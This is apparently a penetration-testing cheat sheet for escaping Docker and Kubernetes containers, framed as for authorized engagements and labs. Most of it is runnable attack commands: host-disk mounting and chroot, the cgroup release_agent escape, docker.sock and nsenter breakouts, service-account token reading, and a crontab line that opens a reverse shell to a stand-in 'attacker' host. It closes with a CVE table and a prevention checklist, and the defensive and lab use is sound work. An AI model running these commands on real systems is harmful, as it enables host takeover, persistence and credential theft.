# Container Escape Reference

Authorized testing only. Use inside contracted engagements or deliberately
vulnerable labs (kata-containers test harness, HackTheBox, TryHackMe).

## Pre-flight Enumeration

```bash
# Am I in a container?
cat /proc/1/cgroup            # look for /docker/, /kubepods/, /containerd/
ls -la /.dockerenv 2>/dev/null
cat /proc/self/status | grep -E 'CapEff|CapPrm|CapBnd|NoNewPrivs|Seccomp'
capsh --print

# Kernel + runtime
uname -a
cat /etc/os-release
mount | grep -E 'cgroup|overlay|proc'

# Is host filesystem or docker.sock mounted?
mount | grep -E 'docker.sock|/host|/hostfs|/rootfs'
ls -la /var/run/docker.sock 2>/dev/null
```

## Escape Vector Catalog

### 1. Privileged container

`CapEff: 0000003fffffffff` or `--privileged` means all capabilities granted
and device cgroup unrestricted.

```bash
# Enumerate host block devices (visible because of --privileged)
fdisk -l
lsblk

# Mount host root and chroot
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

### 2. `CAP_SYS_ADMIN`

Even without full privilege, `CAP_SYS_ADMIN` allows mounting and cgroup
manipulation. Classic `release_agent` escape (pre-5.8 kernels, still viable
in older nodes):

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\nid > /tmp/pwned\n' > /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 3. Docker socket mount

```bash
# /var/run/docker.sock mounted in → full host compromise
docker -H unix:///var/run/docker.sock run --rm --privileged \
  -v /:/host -it alpine chroot /host /bin/sh
```

### 4. Host PID namespace (`--pid=host`)

```bash
# See every host process
ps -ef
# Inject via /proc/<host-pid>/root or nsenter
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

### 5. Sensitive host mount

Common footguns: `/`, `/etc`, `/var/run`, `/root/.ssh`, `/proc`,
`/sys/fs/cgroup` mounted read-write.

```bash
# Write cron job on host via bind mount
echo '* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1' \
  >> /host/etc/crontab
```

### 6. Kernel / runtime CVEs

| CVE            | Component       | Notes                                                              |
|----------------|-----------------|--------------------------------------------------------------------|
| CVE-2019-5736  | runc            | Overwrite host runc from inside container                          |
| CVE-2020-15257 | containerd      | Abstract-namespace socket → host via shim                          |
| CVE-2022-0185  | Linux fsconfig  | Heap overflow → root/escape                                        |
| CVE-2022-0847  | Dirty Pipe      | Overwrite read-only files (incl. host binaries via layered FS)     |
| CVE-2022-0492  | cgroups v1      | release_agent escape with CAP_SYS_ADMIN (pre-patch)                |
| CVE-2022-23648 | containerd      | Host file read via improperly sanitized symlink                    |
| CVE-2024-21626 | runc "Leaky Vessels" | Working directory FD leak → host FS access                   |
| CVE-2024-23651 | BuildKit        | Race in mount cache → host file write                              |
| CVE-2024-23653 | BuildKit        | `--security=insecure` entitlement check bypass                     |
| CVE-2025-23359 | NVIDIA toolkit  | GPU container runtime escape (update to 1.17+)                     |

Always verify patch level on the node before suggesting a CVE-based path.

### 7. Service-account token abuse (K8s)

Not a kernel escape, but the common next step:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
kubectl --token="$TOKEN" --certificate-authority="$CA" auth can-i --list -n "$NS"
```

If `pods/exec` or `create pod` is allowed, chain to a privileged pod on a
targeted node → host.

## Capability Risk Table

| Capability         | Impact when added                                     |
|--------------------|-------------------------------------------------------|
| `CAP_SYS_ADMIN`    | Mount, cgroup, BPF — near-equivalent to root on host  |
| `CAP_SYS_PTRACE`   | Ptrace host PIDs if `--pid=host`                      |
| `CAP_SYS_MODULE`   | Load kernel modules (game over)                       |
| `CAP_DAC_READ_SEARCH` | Bypass file read permissions                       |
| `CAP_DAC_OVERRIDE` | Bypass file permission checks                         |
| `CAP_NET_ADMIN`    | Manipulate host network (if namespace shared)         |
| `CAP_NET_RAW`      | Raw/packet sockets — spoofing, ARP poisoning          |
| `CAP_SYS_CHROOT`   | chroot — mild on its own, dangerous with others       |

## Prevention Checklist

- [ ] No `--privileged`
- [ ] `--cap-drop=ALL` then add only what's needed
- [ ] No `/var/run/docker.sock` mount
- [ ] No `--pid=host`, `--net=host`, `--ipc=host` in workloads
- [ ] Seccomp `RuntimeDefault` or custom allow-list
- [ ] AppArmor or SELinux in enforcing mode
- [ ] User namespaces enabled
- [ ] Node kernel patched (see CVE table above)
- [ ] `readOnlyRootFilesystem: true`
- [ ] `allowPrivilegeEscalation: false`
- [ ] Runtime sensor (Falco/Tetragon) monitoring for escape primitives
